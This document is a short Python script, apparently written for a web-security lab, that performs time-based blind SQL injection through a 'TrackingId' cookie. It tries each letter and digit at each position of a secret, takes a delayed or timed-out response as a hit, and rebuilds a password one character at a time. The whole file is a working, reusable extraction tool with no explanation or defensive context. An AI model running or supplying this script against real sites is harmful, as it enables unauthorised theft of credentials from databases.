import requests
import string

URL = input("Input URL: ").strip()
template = input("Input cookie_payload: ")
password = ""
charset = string.ascii_letters + string.digits

print("Bruteforce...")
for i in range(1, 50):
    found = False
    for char in charset:
        cookie_payload = template.format(i=i, char=char)
        cookies = {"TrackingId": cookie_payload}
        
        try:
            response = requests.get(URL, cookies=cookies, timeout=7)
            if response.elapsed.total_seconds() >= 4.5:
                password += char
                print(f"No-{i} found '{char}' -> {password}")
                found = True
                break
        except:
            password += char
            print(f"No-{i} found '{char}' -> {password}")
            found = True
            break
    if not found:
        print("Done...")
        break

print(f"password = {password}")